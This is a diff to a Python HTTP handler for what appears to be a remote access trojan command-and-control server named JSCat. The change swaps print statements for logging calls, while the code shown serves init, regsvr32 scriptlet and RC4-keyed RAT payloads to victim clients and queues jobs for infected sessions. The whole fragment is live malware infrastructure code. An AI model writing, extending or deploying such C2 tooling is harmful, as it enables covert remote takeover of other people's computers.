@@ -2,9 +2,10 @@
 # coding:utf-8
 from base64 import b64decode
 from http.server import BaseHTTPRequestHandler
-from lib.payload import Payload
-from lib.color import BOLD
-from lib.cipher import ARC4
+from .payload import Payload
+from .color import BOLD
+from .cipher import ARC4
+from .log import Log
 
 
 class JSCatServer(BaseHTTPRequestHandler):
@@ -83,20 +84,20 @@ class JSCatServer(BaseHTTPRequestHandler):
     def do_GET(self):
         context = b''
         if self.path.startswith('/init'):
-            context = Payload.init(self.server.host,self.server.port)
-            print('\n[+]received {} client:{}'.format(BOLD('INIT'),
-                                                      BOLD(self.client_address[0])))
+            context = Payload.init(self.server.host, self.server.port)
+            Log.log_message('\n[+]received {} client:{}'.format(BOLD('INIT'),
+                                                                BOLD(self.client_address[0])), log_type=Log.SERVER)
         elif self.path.startswith('/file.sct'):
-            context = Payload.regsvr(self.server.host,self.server.port)
-            print('\n[+]received {} client:{}'.format(BOLD("REGSVR32"),
-                                                      BOLD(self.client_address[0])))
+            context = Payload.regsvr(self.server.host, self.server.port)
+            Log.log_message('\n[+]received {} client:{}'.format(BOLD("REGSVR32"),
+                                                                BOLD(self.client_address[0])), log_type=Log.SERVER)
         elif self.path == '/rat':
             context = Payload.rat(
-                self.server.host,self.server.port, self.server.rc4_key, self.server.sleep_time)
+                self.server.host, self.server.port, self.server.rc4_key, self.server.sleep_time)
             self.server.shell.prompt_msg = '{} >'.format(
                 self.client_address[0])
-            print('\n[+]received {} client:{}'.format(BOLD('RAT'),
-                                                      BOLD(self.client_address[0])))
+            Log.log_message('\n[+]received {} client:{}'.format(BOLD('RAT'),
+                                                                BOLD(self.client_address[0])), log_type=Log.SERVER)
 
         self.__to_reply(200, context)
 
@@ -121,16 +122,16 @@ class JSCatServer(BaseHTTPRequestHandler):
             if session_key in self.session.SESSIONS:
                 self.session.update_session(session_key)
                 if job_id:
-                    print('\n[+]received client:{},SID/JOB:{}/{}, bytes {}'.format(
-                        BOLD(self.client_address[0]), BOLD(self.session.SESSIONS[session_key]['id']), BOLD(job_id), BOLD(content_len)))
+                    Log.log_message('\n[+]received client:{},SID/JOB:{}/{}, bytes {}'.format(
+                        BOLD(self.client_address[0]), BOLD(self.session.SESSIONS[session_key]['id']), BOLD(job_id), BOLD(content_len)), log_type=Log.SERVER)
                     self.session.check_job(session_key, job_id, job_context)
                 # 获取待执行的一个任务:
                 context = self.session.load_job(session_key)
             # 如果session未初始化，对返回job ID == 1的任务进行session初始化；否则重新执行初始化任务
             else:
                 if job_id and job_id == 1:
-                    print('\n[+]received {}, client:{},bytes {}'.format(BOLD('SESSION INIT'),
-                                                                        BOLD(self.client_address[0]), BOLD(content_len)))
+                    Log.log_message('\n[+]received {}, client:{},bytes {}'.format(BOLD('SESSION INIT'),
+                                                                                  BOLD(self.client_address[0]), BOLD(content_len)), log_type=Log.SERVER)
                     # JOB ID==1，表示这是session初始化任务
                     self.session.init_session(
                         session_key, self.client_address[0], self.headers['User-Agent'], job_context)
